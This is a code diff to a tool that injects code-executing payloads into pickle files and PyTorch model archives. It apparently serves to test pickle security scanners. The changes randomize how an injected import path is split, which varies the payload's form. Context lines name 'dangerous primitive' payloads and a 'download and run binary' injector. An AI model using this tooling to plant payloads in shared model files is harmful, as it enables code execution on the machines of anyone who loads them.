@@ -84,8 +84,9 @@ DANGEROUS_PRIMITIVE_PAYLOADS = {
 }
 
 
-def inject_exec_primitive(pickled: Pickled, module: str, attr: str, args: list):
+def inject_exec_primitive(pickled: Pickled, function: str, args: list):
     run_first = random.choice([True, False])
+    module, attr = _rand_split_import(function)
     pickled.insert_python(*args, module=module, attr=attr, run_first=run_first)
 
 
@@ -95,12 +96,15 @@ ALL_PAYLOADS = {
     "dl and run binary": inject_download_and_run_binary,
 }
 
+def _rand_split_import(import_str):
+    pos = random.randint(1,import_str.count("."))
+    import_str = import_str.split(".")
+    return ".".join(import_str[:pos]), ".".join(import_str[pos:])
 
 def _add_simple_payload(key, pl):
     function = pl[0]
-    module, attr = function.rsplit(".", 1)
     args = list(pl[1:])
-    ALL_PAYLOADS[key] = partial(inject_exec_primitive, module=module, attr=attr, args=args)
+    ALL_PAYLOADS[key] = partial(inject_exec_primitive, function=function, args=args)
 
 
 for key, pl in (EXEC_PRIMITIVE_PAYLOADS | DANGEROUS_PRIMITIVE_PAYLOADS).items():
@@ -146,9 +150,10 @@ def inject_pytorch_file(infile: Path, outfile: Path, payload_key: Optional[str] 
         if not injected and element.filename.endswith((".pkl", ".pickle", ".pk")):
             print(f"\t\tInjecting into archive element {element.filename}")
             # Only inject one pickle file per archive
-            with zipfile.Path(archive, at=element.filename).open("rb") as inf, zipfile.Path(
-                outarchive, at=element.filename
-            ).open("wb") as outf:
+            with (
+                zipfile.Path(archive, at=element.filename).open("rb") as inf,
+                zipfile.Path(outarchive, at=element.filename).open("wb") as outf,
+            ):
                 res = _inject_payload(
                     inf,
                     outf,
